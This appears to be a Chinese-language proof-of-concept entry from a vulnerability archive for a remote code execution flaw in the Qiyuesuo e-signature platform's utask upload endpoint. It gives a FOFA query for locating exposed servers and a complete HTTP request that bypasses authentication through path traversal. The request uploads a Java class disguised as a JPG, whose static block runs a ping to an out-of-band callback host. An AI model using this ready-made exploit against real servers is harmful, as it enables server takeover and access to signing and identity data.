# 契约锁utask存在远程命令执行漏洞

# 一、漏洞简介
Qiyuesuo是一款数字化可信基础服务平台，为组织提供“数字身份、电子签章、印章管控以及数据存证服务”于一体的数字化可信基础解决方案。Qiyuesuo存在前台代码执行漏洞，攻击者可构造恶意请求绕过相关认证调用后台功能造成远程代码执行，控制服务器。

# 二、影响版本
+ 契约锁

# 三、资产测绘
+ fofa`app="契约锁-电子签署平台"`
+ 特征


# 四、漏洞复现
```http
POST /login/%2E%2E;/utask/upload HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.37
Connection: close
Content-Length: 498
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryco2lQ5vxCOn9Aq2R
Accept-Encoding: gzip


------WebKitFormBoundaryco2lQ5vxCOn9Aq2R
Content-Disposition: form-data; name="type";

TIMETASK
------WebKitFormBoundaryco2lQ5vxCOn9Aq2R
Content-Disposition: form-data; name="file";filename="qys.jpg"

package qiyuesuo;

import com.qiyuesuo.utask.java.BaseTimerTask;

public class qiyuesuo004 extends BaseTimerTask {
    static {try{Runtime.getRuntime().exec("ping grewuo.ceye.io");}catch (Exception e){}}
}
------WebKitFormBoundaryco2lQ5vxCOn9Aq2R--
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cxxpice0g3tk68ed>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
